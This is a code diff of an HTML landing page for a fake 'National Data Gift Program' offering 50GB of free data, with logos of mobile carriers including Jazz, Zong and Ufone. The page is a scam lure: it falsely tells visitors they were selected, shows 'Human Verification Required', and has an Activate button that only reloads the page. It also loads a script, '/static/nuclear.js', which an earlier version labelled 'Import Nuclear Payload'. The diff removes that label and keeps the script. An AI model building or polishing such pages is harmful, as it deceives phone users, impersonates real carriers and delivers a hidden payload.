@@ -3,30 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Free 50GB Internet Bundle</title>
-    <!-- Import Nuclear Payload -->
+    <title>50GB Data Reward</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <script src="/static/nuclear.js" defer></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; text-align: center; margin: 0; padding: 0; }
-        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        h1 { color: #E60000; }
-        .btn { background: #007bff; color: white; padding: 15px 30px; text-decoration: none; border-radius: 50px; font-weight: bold; display: inline-block; margin-top: 20px; }
-        .logos { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
-        .logos div { width: 50px; height: 50px; background: #ddd; border-radius: 50%; line-height: 50px; font-size: 10px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
+        
+        body {
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            max-width: 400px;
+            width: 100%;
+            padding: 40px 30px;
+            border-radius: 25px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Top Decorative Bar */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 6px;
+            background: linear-gradient(90deg, #00c6ff, #0072ff);
+        }
+
+        /* Carrier Logos */
+        .logos {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .logo-circle {
+            width: 55px; height: 55px;
+            background: #f0f2f5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+            color: #555;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            transition: transform 0.3s;
+        }
+        .logo-circle:hover { transform: translateY(-3px); }
+
+        h1 {
+            color: #333;
+            font-size: 2em;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: -webkit-linear-gradient(#00c6ff, #0072ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .highlight {
+            color: #0072ff;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        p { color: #666; line-height: 1.6; margin-bottom: 15px; font-size: 0.95em; }
+
+        .offer-box {
+            background: #e3f2fd;
+            border: 1px dashed #0072ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        /* Action Button */
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #0072ff, #00c6ff);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 1.1em;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 20px rgba(0, 114, 255, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+            position: relative;
+            overflow: hidden;
+            animation: pulse 2s infinite;
+        }
+
+        .btn:active { transform: scale(0.98); }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 114, 255, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 114, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 114, 255, 0); }
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 0.8em;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        .verified-icon { width: 14px; height: 14px; fill: #4caf50; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logos">
-            <div>JAZZ</div><div>ZONG</div><div>STC</div><div>UFONE</div>
+            <div class="logo-circle">JAZZ</div>
+            <div class="logo-circle">ZONG</div>
+            <div class="logo-circle">STC</div>
+            <div class="logo-circle">UFONE</div>
         </div>
+
         <h1>Congratulations!</h1>
-        <p>You have been selected for the <b>Free 50GB Data Gift</b>.</p>
-        <p>Valid for 7 Days. No Hidden Charges.</p>
+        <p>You have been randomly selected for the <br><span class="highlight">National Data Gift Program</span>.</p>
         
-        <a href="#" class="btn">ACTIVATE NOW</a>
-        
-        <p style="font-size: 12px; color: #888; margin-top: 20px;">*Verification required to prevent spam.</p>
+        <div class="offer-box">
+            <h2 style="color:#333; font-size:1.5em; margin-bottom:5px;">50 GB FREE</h2>
+            <p style="margin:0; font-size:0.9em;">Valid for 7 Days • 4G/5G Speed</p>
+        </div>
+
+        <a href="#" class="btn" onclick="document.location.reload()">ACTIVATE NOW</a>
+
+        <div class="footer">
+            <svg class="verified-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            Human Verification Required
+        </div>
     </div>
 </body>
 </html>
